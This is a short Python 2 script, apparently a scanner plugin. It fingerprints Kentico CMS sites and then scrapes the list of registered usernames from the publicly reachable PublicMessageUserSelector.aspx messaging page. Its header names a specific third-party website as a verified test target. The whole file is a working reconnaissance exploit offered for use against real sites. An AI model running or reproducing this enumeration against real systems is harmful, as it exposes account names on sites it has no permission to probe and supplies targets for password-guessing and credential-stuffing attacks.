# Detects Kentico CMS
# @penetrat0r
#
# Test site verified http://www.magnoliaav.com/
# Vulnerability discovered on Kentico CMS platform at the following directory:
# /CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx
# Build automated enumeration of this page

from bs4 import BeautifulSoup
import requests
import re

directories = ["CMSPages/GetCMSVersion.aspx", "CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx"]
userlist = []

def check(header, content, targetURL):
	if "CMSPreferredCulture".upper() in header or "CMSCurrentTheme".upper() in header:
		try:
			v = requests.get(targetURL +  "CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx")
			data = v.content
			print "\n** Vulnerability discovered on Kentico CMS platform at the following directory: **\n"
			print "   /CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx \n"
			print "The following users have been discovered:\n"
			getUsers(data)
			for userid in userlist:
				print userid

		except Exception:
			pass

		return True	
	else:	
		for directory in directories:
			r = requests.get(targetURL + directory)
			file_contents = str(r.content).upper()
			if directory == "CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx":
				if "titleFullScreen".upper() in content:
					print "\n** Vulnerability discovered on Kentico CMS platform at the following directory: **\n"
					print "   /CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx \n"
					print "The following users have been discovered:\n"
					getUsers(content)
					for userid in userlist:
						print userid

					return True
			elif 'CMS version'.upper() in file_contents:
				return True
			else:
				pass

def getUsers(content):
	soup = BeautifulSoup(content)
	tables = soup.findAll("tr", attrs={"class":"EvenRow"})

	for robblers in range(len(tables)):
		x = str(tables[robblers]).split("CloseAndRefresh")[1::2]
		y = str(x).split(">")[1::2]
		z = str(y[0]).split("<")
		userlist.append(z[0])

	tables = soup.findAll("tr", attrs={"class":"OddRow"})
	for robblerers in range(len(tables)):
		x = str(tables[robblerers]).split("CloseAndRefresh")[1::2]
		y = str(x).split(">")[1::2]
		z = str(y[0]).split("<")
		userlist.append(z[0])